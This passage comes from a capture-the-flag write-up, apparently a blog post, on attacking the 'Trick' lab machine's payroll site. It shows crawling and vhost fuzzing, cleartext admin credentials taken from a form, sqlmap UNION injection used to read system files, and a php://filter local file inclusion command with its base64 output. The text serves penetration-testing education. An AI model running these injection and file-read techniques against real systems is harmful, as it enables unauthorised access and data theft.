+<div class="highlight"><pre><span></span><code>$ grep <span class="m">200</span> feroxbuster_preprod-payroll.trick.htb.log <span class="p">|</span> awk <span class="s1">&#39;{print $6}&#39;</span> <span class="p">|</span> ~/go/bin/cariddi -plain <span class="p">|</span> tee -a cariddi_preprod-payroll.trick.htb.log
+</code></pre></div>
+
+<p>Same with hakrawler</p>
+<div class="highlight"><pre><span></span><code>$ grep <span class="m">200</span> feroxbuster_preprod-payroll.trick.htb.log <span class="p">|</span> awk <span class="s1">&#39;{print $6}&#39;</span> <span class="p">|</span> ~/go/bin/hakrawler -d <span class="m">4</span> &gt; hakrawler_preprod-payroll.trick.htb.log
+</code></pre></div>
+
+<p>Putting all together</p>
+<div class="highlight"><pre><span></span><code>$ grep <span class="m">200</span> feroxbuster_preprod-payroll.trick.htb.log <span class="p">|</span> awk <span class="s1">&#39;{print $6}&#39;</span> &gt;&gt; url_collection_preprod-payroll.trick.htb.log
+$ cat cariddi_preprod-payroll.trick.htb.log &gt;&gt; url_collection_preprod-payroll.trick.htb.log
+$ cat hakrawler_preprod-payroll.trick.htb.log &gt;&gt; url_collection_preprod-payroll.trick.htb.log
+<span class="c1"># cleaning with uro</span>
+$ cat url_collection_preprod-payroll.trick.htb.log <span class="p">|</span> uro &gt;&gt; cleaned_urls_preprod-payroll.trick.htb.log
+<span class="c1"># I remain with those URLs</span>
+$ cat cleaned_urls_preprod-payroll.trick.htb.log
+http://preprod-payroll.trick.htb/home.php
+http://preprod-payroll.trick.htb/login.php
+http://preprod-payroll.trick.htb/header.php
+http://preprod-payroll.trick.htb/users.php
+http://preprod-payroll.trick.htb/ajax.php?action<span class="o">=</span><span class="nb">logout</span>
+http://preprod-payroll.trick.htb/navbar.php
+http://preprod-payroll.trick.htb/department.php
+http://preprod-payroll.trick.htb/topbar.php
+http://preprod-payroll.trick.htb/position.php
+http://preprod-payroll.trick.htb/employee.php
+http://preprod-payroll.trick.htb/payroll.php
+http://preprod-payroll.trick.htb/index.php?page<span class="o">=</span>home
+</code></pre></div>
+
+<p>I can go even further. I download all those sites and search through the source code.</p>
+<div class="highlight"><pre><span></span><code>$ wget -i cleaned_urls_preprod-payroll.trick.htb.log
+$ ls -la
+-rw-r--r-- <span class="m">1</span> root root <span class="m">5571</span> Jun <span class="m">21</span> <span class="m">14</span>:42 <span class="s1">&#39;ajax.php?action=logout&#39;</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">4844</span> Jun <span class="m">21</span> <span class="m">14</span>:42  department.php
+-rw-r--r-- <span class="m">1</span> root root <span class="m">2717</span> Jun <span class="m">21</span> <span class="m">14</span>:42  employee.php
+-rw-r--r-- <span class="m">1</span> root root <span class="m">2548</span> Jun <span class="m">21</span> <span class="m">14</span>:42  header.php
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">486</span> Jun <span class="m">21</span> <span class="m">14</span>:42  home.php
+-rw-r--r-- <span class="m">1</span> root root <span class="m">5571</span> Jun <span class="m">21</span> <span class="m">14</span>:42 <span class="s1">&#39;index.php?page=home&#39;</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">5571</span> Jun <span class="m">21</span> <span class="m">14</span>:42  login.php
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1382</span> Jun <span class="m">21</span> <span class="m">14</span>:42  navbar.php
+-rw-r--r-- <span class="m">1</span> root root <span class="m">3142</span> Jun <span class="m">21</span> <span class="m">14</span>:42  payroll.php
+-rw-r--r-- <span class="m">1</span> root root <span class="m">5549</span> Jun <span class="m">21</span> <span class="m">14</span>:42  position.php
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">585</span> Jun <span class="m">21</span> <span class="m">14</span>:42  topbar.php
+-rw-r--r-- <span class="m">1</span> root root <span class="m">2197</span> Jun <span class="m">21</span> <span class="m">14</span>:42  users.php
+</code></pre></div>
+
+<p>Now I am using some magical, not so magical greps and regular expressions so find endpoint and parameters.</p>
+<div class="highlight"><pre><span></span><code>$ grep -h -i <span class="s2">&quot;\.php&quot;</span> * <span class="p">|</span> rg -o -e <span class="s2">&quot;((&#39;|\&quot;)(.*?)(&#39;|\&quot;))&quot;</span> -r <span class="s1">&#39;$3&#39;</span> <span class="p">|</span> grep php <span class="p">|</span> sort -u
+ajax.php?action<span class="o">=</span>calculate_payroll
+ajax.php?action<span class="o">=</span>delete_department
+ajax.php?action<span class="o">=</span>delete_employee
+ajax.php?action<span class="o">=</span>delete_payroll
+ajax.php?action<span class="o">=</span>delete_position
+ajax.php?action<span class="o">=</span>delete_user
+ajax.php?action<span class="o">=</span>login
+ajax.php?action<span class="o">=</span><span class="nb">logout</span>
+ajax.php?action<span class="o">=</span>save_department
+ajax.php?action<span class="o">=</span>save_position
+index.php?page<span class="o">=</span>allowances
+index.php?page<span class="o">=</span>attendance
+index.php?page<span class="o">=</span>deductions
+index.php?page<span class="o">=</span>department
+index.php?page<span class="o">=</span>employee
+index.php?page<span class="o">=</span>home
+index.php?page<span class="o">=</span>payroll
+index.php?page<span class="o">=</span>payroll_items<span class="p">&amp;</span><span class="nv">id</span><span class="o">=</span>
+index.php?page<span class="o">=</span>position
+manage_employee.php
+manage_employee.php?id<span class="o">=</span>
+manage_payroll.php
+manage_payroll.php?id<span class="o">=</span>
+manage_user.php
+manage_user.php?id<span class="o">=</span>
+view_employee.php?id<span class="o">=</span>
+voting.php
+</code></pre></div>
+
+<p>I end up with a very nice list. I go with <code>manage_users.php?id=1</code> at very first. Visiting the page I are greeted with a nice prefilled form, hoping the password might be in cleartext in the source code.</p>
+<p>And yesssss, I are lucky.</p>
+<h1>Unsecured Credentials (T1552)</h1>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;container-fluid&quot;</span><span class="p">&gt;</span>
+
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;manage-user&quot;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;id&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1&quot;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;name&quot;</span><span class="p">&gt;</span>Name<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;name&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;name&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Administrator&quot;</span> <span class="na">required</span><span class="p">&gt;</span>
+        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;username&quot;</span><span class="p">&gt;</span>Username<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Enemigosss&quot;</span> <span class="na">required</span><span class="p">&gt;</span>
+        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;password&quot;</span><span class="p">&gt;</span>Password<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;SuperGucciRainbowCake&quot;</span> <span class="na">required</span><span class="p">&gt;</span>
+        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;type&quot;</span><span class="p">&gt;</span>User Type<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">select</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;type&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;type&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;custom-select&quot;</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1&quot;</span> <span class="na">selected</span><span class="p">&gt;</span>Admin<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;2&quot;</span> <span class="p">&gt;</span>Staff<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
+            <span class="p">&lt;/</span><span class="nt">select</span><span class="p">&gt;</span>
+        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="w"></span>
+<span class="w">    </span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#manage-user&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="w"></span>
+<span class="w">        </span><span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span><span class="w"></span>
+<span class="w">        </span><span class="nx">start_load</span><span class="p">()</span><span class="w"></span>
+<span class="w">        </span><span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span><span class="w"></span>
+<span class="w">            </span><span class="nx">url</span><span class="o">:</span><span class="s1">&#39;ajax.php?action=save_user&#39;</span><span class="p">,</span><span class="w"></span>
+<span class="w">            </span><span class="nx">method</span><span class="o">:</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="w"></span>
+<span class="w">            </span><span class="nx">data</span><span class="o">:</span><span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">serialize</span><span class="p">(),</span><span class="w"></span>
+<span class="w">            </span><span class="nx">success</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">resp</span><span class="p">){</span><span class="w"></span>
+<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="nx">resp</span><span class="w"> </span><span class="o">==</span><span class="mf">1</span><span class="p">){</span><span class="w"></span>
+<span class="w">                    </span><span class="nx">alert_toast</span><span class="p">(</span><span class="s2">&quot;Data successfully saved&quot;</span><span class="p">,</span><span class="s1">&#39;success&#39;</span><span class="p">)</span><span class="w"></span>
+<span class="w">                    </span><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="w"></span>
+<span class="w">                        </span><span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">()</span><span class="w"></span>
+<span class="w">                    </span><span class="p">},</span><span class="mf">1500</span><span class="p">)</span><span class="w"></span>
+<span class="w">                </span><span class="p">}</span><span class="w"></span>
+<span class="w">            </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="p">})</span><span class="w"></span>
+<span class="w">    </span><span class="p">})</span><span class="w"></span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>I have credentials now</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Administrator</td>
+<td>Enemigosss</td>
+<td>SuperGucciRainbowCake</td>
+</tr>
+</tbody>
+</table>
+<p>I can login with those credentials to the website, but they don't work on SSH.</p>
+<h1>SQL Injection</h1>
+<p>I take a look on the admin panel later, I first go with the SQL injection tries. I take the endpoint list I gathered already and filter it even more, so sqlmap can perform its magic.</p>
+<div class="highlight"><pre><span></span><code>http://preprod-payroll.trick.htb/ajax.php?action=login
+http://preprod-payroll.trick.htb/index.php?page=payroll
+http://preprod-payroll.trick.htb/index.php?page=payroll_items&amp;id=1
+http://preprod-payroll.trick.htb/manage_employee.php?id=1
+http://preprod-payroll.trick.htb/manage_payroll.php?id=1
+http://preprod-payroll.trick.htb/manage_user.php?id=1
+http://preprod-payroll.trick.htb/view_employee.php?id=1
+http://preprod-payroll.trick.htb/voting.php
+</code></pre></div>
+
+<p>Running sqlmap against all urls</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -m ../htb/trick/extracte_endpoints_params.txt
+</code></pre></div>
+
+<p>sqlmap did a great job, it found UNION based injections on multiple endpoints.
+Example:</p>
+<div class="highlight"><pre><span></span><code>http://preprod-payroll.trick.htb/manage_employee.php?id=-1+union+select+1,2,0x3a3a3a3a3a3a3a3a3a3a,4,5,6,7,8
+</code></pre></div>
+
+<p>Let's extract some juicy information and maybe I can get a shell?!</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -u &#39;http://preprod-payroll.trick.htb/manage_employee.php?id=1&#39; --current-user --dbs
+current user: &#39;remo@localhost&#39;
+available databases [2]:
+[*] information_schema
+[*] payroll_db
+=======
+</code></pre></div>
+
+<p>The current DB user can read system files and I chose sqlmap to read common files from the system and dump those to disk.</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s1">&#39;http://preprod-payroll.trick.htb/manage_employee.php?id=1&#39;</span> --common-files
+</code></pre></div>
+
+<p>I receive files like passwd and nginx configuration. Let's grep through those files.</p>
+<div class="highlight"><pre><span></span><code>grep -i payroll /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/*
+/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default:        server_name preprod-payroll.trick.htb<span class="p">;</span>
+/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default:        root /var/www/payroll<span class="p">;</span>
+/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default:        server_name preprod-payroll.trick.htb<span class="p">;</span>
+/root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default:        root /var/www/payroll<span class="p">;</span>
+</code></pre></div>
+
+<p>nginx gives us information about vhosts and local path</p>
+<div class="highlight"><pre><span></span><code>grep -E <span class="s2">&quot;server_name|root &quot;</span> /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
+        server_name trick.htb<span class="p">;</span>
+        root /var/www/html<span class="p">;</span>
+        server_name _<span class="p">;</span>
+        server_name preprod-marketing.trick.htb<span class="p">;</span>
+        root /var/www/market<span class="p">;</span>
+        server_name preprod-payroll.trick.htb<span class="p">;</span>
+        root /var/www/payroll<span class="p">;</span>
+</code></pre></div>
+
+<p>Ok, two vhosts the already known <code>preprod-payroll.trick.htb</code> and the yet unknown host <code>preprod-marketing.trick.htb</code>.</p>
+<h2>Alternative way: vhost Fuzzing</h2>
+<div class="highlight"><pre><span></span><code>$ ~/go/bin/ffuf -w SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt  -u http://preprod-payroll.trick.htb  -H <span class="s2">&quot;HOST: preprod-FUZZ.trick.htb&quot;</span> -fs <span class="m">5480</span>
+
+        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\</span>
+       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
+       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\</span>
+        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\</span>
+          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
+
+       v1.5.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://preprod-payroll.trick.htb
+ :: Wordlist         : FUZZ: SecLists-2022.2/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: preprod-FUZZ.trick.htb
+ :: Follow redirects : <span class="nb">false</span>
+ :: Calibration      : <span class="nb">false</span>
+ :: Timeout          : <span class="m">10</span>
+ :: Threads          : <span class="m">40</span>
+ :: Matcher          : Response status: <span class="m">200</span>,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: <span class="m">5480</span>
+________________________________________________
+
+marketing               <span class="o">[</span>Status: <span class="m">200</span>, Size: <span class="m">9660</span>, Words: <span class="m">3007</span>, Lines: <span class="m">179</span>, Duration: 26ms<span class="o">]</span>
+payroll                 <span class="o">[</span>Status: <span class="m">302</span>, Size: <span class="m">9546</span>, Words: <span class="m">1453</span>, Lines: <span class="m">267</span>, Duration: 38ms<span class="o">]</span>
+:: Progress: <span class="o">[</span><span class="m">114441</span>/114441<span class="o">]</span> :: Job <span class="o">[</span><span class="m">1</span>/1<span class="o">]</span> :: <span class="m">1262</span> req/sec :: Duration: <span class="o">[</span><span class="m">0</span>:01:34<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+</code></pre></div>
+
+<p>Aaaand now I might read webserver files using the SQL injection?
+In the very first file I read <code>index.php</code> I find a possible <strong>File Inclusion</strong> vulnerability.</p>
+<div class="highlight"><pre><span></span><code><span class="x">--------snip---------</span>
+<span class="x">  &lt;main id=&quot;view-panel&quot; &gt;</span>
+<span class="x">      </span><span class="cp">&lt;?php</span> <span class="nv">$page</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">:</span><span class="s1">&#39;home&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">      </span><span class="cp">&lt;?php</span> <span class="k">include</span> <span class="nv">$page</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">  &lt;/main&gt;</span>
+<span class="x">--------snip---------</span>
+</code></pre></div>
+
+<p>Local File Inclusion is working great. I can extract data if I know the path. I extract the <code>login.php</code> file using</p>
+<div class="highlight"><pre><span></span><code>curl <span class="s1">&#39;http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=login&#39;</span> --silent <span class="p">|</span> rg --multiline --multiline-dotall <span class="s1">&#39;(&lt;main id=&quot;view-panel&quot; &gt;(.*?)&lt;/main&gt;)&#39;</span> -a
+  &lt;main <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;view-panel&quot;</span> &gt;
+                PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQoNCjxoZWFkPg0KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQogIDxtZXRhIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIG5hbWU9InZpZXdwb3J0Ij4NCg0KICA8dGl0bGU+QWRtaW4gfCBFbXBsb3llZSdzIFBheXJvbGwgTWFuYWdlbWVudCBTeXN0ZW08L3RpdGxlPg0KIAkNCg0KPD9waHAgaW5jbHVkZSgnLi9oZWFkZXIucGhwJyk7ID8+DQo8P3BocCBpbmNsdWRlKCcuL2RiX2Nvbm5lY3QucGhwJyk7ID8+DQo8P3BocCANCnNlc3Npb25fc3RhcnQoKTsNCmlmKGlzc2V0KCRfU0VTU0lPTlsnbG9naW5faWQnXSkpDQpoZWFkZXIoImxvY2F0aW9uOmluZGV4LnBocD9wYWdlPWhvbWUiKTsNCg0KPz4NCg0KPC9oZWFkPg0KPHN0eWxlPg0KCWJvZHl7DQoJCXdpZHRoOiAxMDAlOw0KCSAgICBoZWlnaHQ6IGNhbGMoMTAwJSk7DQoJICAgIC8qYmFja2dyb3VuZDogIzAwN2JmZjsqLw0KCX0NCgltYWluI21haW57DQoJCXdpZHRoOjEwMCU7DQoJCWhlaWdodDogY2FsYygxMDAlKTsNCgkJYmFja2dyb3VuZDp3aGl0ZTsNCgl9DQoJI2xvZ2luLXJpZ2h0ew0KCQlwb3NpdGlvbjogYWJzb2x1dGU7DQoJCXJpZ2h0OjA7DQoJCXdpZHRoOjQwJTsNCgkJaGVpZ2h0OiBjYWxjKDEwMCUpOw0KCQliYWNrZ3JvdW5kOndoaXRlOw0KCQlkaXNwbGF5OiBmbGV4Ow0KCQlhbGlnbi1pdGVtczogY2VudGVyOw0KCX0NCgkjbG9naW4tbGVmdHsNCgkJcG9zaXRpb246IGFic29sdXRlOw0KCQlsZWZ0OjA7DQoJCXdpZHRoOjYwJTsNCgkJaGVpZ2h0OiBjYWxjKDEwMCUpOw0KCQliYWNrZ3JvdW5kOiM1OWI2ZWM2MTsNCgkJZGlzcGxheTogZmxleDsNCgkJYWxpZ24taXRlbXM6IGNlbnRlcjsNCgkJYmFja2dyb3VuZDogdXJsKGFzc2V0cy9pbWcvcGF5cm9sbC1jb3Zlci5qcGcpOw0KCSAgICBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0Ow0KCSAgICBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KCX0NCgkjbG9naW4tcmlnaHQgLmNhcmR7DQoJCW1hcmdpbjogYXV0bzsNCgkJei1pbmRleDogMQ0KCX0NCgkubG9nbyB7DQogICAgbWFyZ2luOiBhdXRvOw0KICAgIGZvbnQtc2l6ZTogOHJlbTsNCiAgICBiYWNrZ3JvdW5kOiB3aGl0ZTsNCiAgICBwYWRkaW5nOiAuNWVtIDAuN2VtOw0KICAgIGJvcmRlci1yYWRpdXM6IDUwJSA1MCU7DQogICAgY29sb3I6ICMwMDAwMDBiMzsNCiAgICB6LWluZGV4OiAxMDsNCn0NCmRpdiNsb2dpbi1yaWdodDo6YmVmb3JlIHsNCiAgICBjb250ZW50OiAiIjsNCiAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgdG9wOiAwOw0KICAgIGxlZnQ6IDA7DQogICAgd2lkdGg6IGNhbGMoMTAwJSk7DQogICAgaGVpZ2h0OiBjYWxjKDEwMCUpOw0KICAgIGJhY2tncm91bmQ6ICM5ZmEzYTdlMDsNCn0NCg0KPC9zdHlsZT4NCg0KPGJvZHk+DQoNCg0KICA8bWFpbiBpZD0ibWFpbiIgY2xhc3M9IiBiZy1kYXJrIj4NCiAgCQk8ZGl2IGlkPSJsb2dpbi1sZWZ0Ij4NCiAgCQkJDQogIAkJPC9kaXY+DQoNCiAgCQk8ZGl2IGlkPSJsb2dpbi1yaWdodCI+DQogIAkJCTxkaXYgY2xhc3M9ImNhcmQgY29sLW1kLTgiPg0KICAJCQkJPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgCQkJCQkJDQogIAkJCQkJPGZvcm0gaWQ9ImxvZ2luLWZvcm0iID4NCiAgCQkJCQkJPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+DQogIAkJCQkJCQk8bGFiZWwgZm9yPSJ1c2VybmFtZSIgY2xhc3M9ImNvbnRyb2wtbGFiZWwiPlVzZXJuYW1lPC9sYWJlbD4NCiAgCQkJCQkJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0idXNlcm5hbWUiIG5hbWU9InVzZXJuYW1lIiBjbGFzcz0iZm9ybS1jb250cm9sIj4NCiAgCQkJCQkJPC9kaXY+DQogIAkJCQkJCTxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPg0KICAJCQkJCQkJPGxhYmVsIGZvcj0icGFzc3dvcmQiIGNsYXNzPSJjb250cm9sLWxhYmVsIj5QYXNzd29yZDwvbGFiZWw+DQogIAkJCQkJCQk8aW5wdXQgdHlwZT0icGFzc3dvcmQiIGlkPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiPg0KICAJCQkJCQk8L2Rpdj4NCiAgCQkJCQkJPGNlbnRlcj48YnV0dG9uIGNsYXNzPSJidG4tc20gYnRuLWJsb2NrIGJ0bi13YXZlIGNvbC1tZC00IGJ0bi1wcmltYXJ5Ij5Mb2dpbjwvYnV0dG9uPjwvY2VudGVyPg0KICAJCQkJCTwvZm9ybT4NCiAgCQkJCTwvZGl2Pg0KICAJCQk8L2Rpdj4NCiAgCQk8L2Rpdj4NCiAgIA0KDQogIDwvbWFpbj4NCg0KICA8YSBocmVmPSIjIiBjbGFzcz0iYmFjay10by10b3AiPjxpIGNsYXNzPSJpY29mb250LXNpbXBsZS11cCI+PC9pPjwvYT4NCg0KDQo8L2JvZHk+DQo8c2NyaXB0Pg0KCSQoJyNsb2dpbi1mb3JtJykuc3VibWl0KGZ1bmN0aW9uKGUpew0KCQllLnByZXZlbnREZWZhdWx0KCkNCgkJJCgnI2xvZ2luLWZvcm0gYnV0dG9uW3R5cGU9ImJ1dHRvbiJdJykuYXR0cignZGlzYWJsZWQnLHRydWUpLmh0bWwoJ0xvZ2dpbmcgaW4uLi4nKTsNCgkJaWYoJCh0aGlzKS5maW5kKCcuYWxlcnQtZGFuZ2VyJykubGVuZ3RoID4gMCApDQoJCQkkKHRoaXMpLmZpbmQoJy5hbGVydC1kYW5nZXInKS5yZW1vdmUoKTsNCgkJJC5hamF4KHsNCgkJCXVybDonYWpheC5waHA/YWN0aW9uPWxvZ2luJywNCgkJCW1ldGhvZDonUE9TVCcsDQoJCQlkYXRhOiQodGhpcykuc2VyaWFsaXplKCksDQoJCQllcnJvcjplcnI9PnsNCgkJCQljb25zb2xlLmxvZyhlcnIpDQoJCSQoJyNsb2dpbi1mb3JtIGJ1dHRvblt0eXBlPSJidXR0b24iXScpLnJlbW92ZUF0dHIoJ2Rpc2FibGVkJykuaHRtbCgnTG9naW4nKTsNCg0KCQkJfSwNCgkJCXN1Y2Nlc3M6ZnVuY3Rpb24ocmVzcCl7DQoJCQkJaWYocmVzcCA9PSAxKXsNCgkJCQkJbG9jYXRpb24uaHJlZiA9J2luZGV4LnBocD9wYWdlPWhvbWUnOw0KCQkJCX1lbHNlIGlmKHJlc3AgPT0gMil7DQoJCQkJCWxvY2F0aW9uLmhyZWYgPSd2b3RpbmcucGhwJzsNCgkJCQl9ZWxzZXsNCgkJCQkJJCgnI2xvZ2luLWZvcm0nKS5wcmVwZW5kKCc8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiPlVzZXJuYW1lIG9yIHBhc3N3b3JkIGlzIGluY29ycmVjdC48L2Rpdj4nKQ0KCQkJCQkkKCcjbG9naW4tZm9ybSBidXR0b25bdHlwZT0iYnV0dG9uIl0nKS5yZW1vdmVBdHRyKCdkaXNhYmxlZCcpLmh0bWwoJ0xvZ2luJyk7DQoJCQkJfQ0KCQkJfQ0KCQl9KQ0KCX0pDQo8L3NjcmlwdD4JDQo8L2h0bWw+
+
+  &lt;/main&gt;
+</code></pre></div>
+
+<p>Decoded</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;en&quot;</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;width=device-width, initial-scale=1.0&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;viewport&quot;</span><span class="p">&gt;</span>
+
+  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Admin | Employee&#39;s Payroll Management System<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+
+
+<span class="cp">&lt;?php include(&#39;./header.php&#39;); ?&gt;</span>
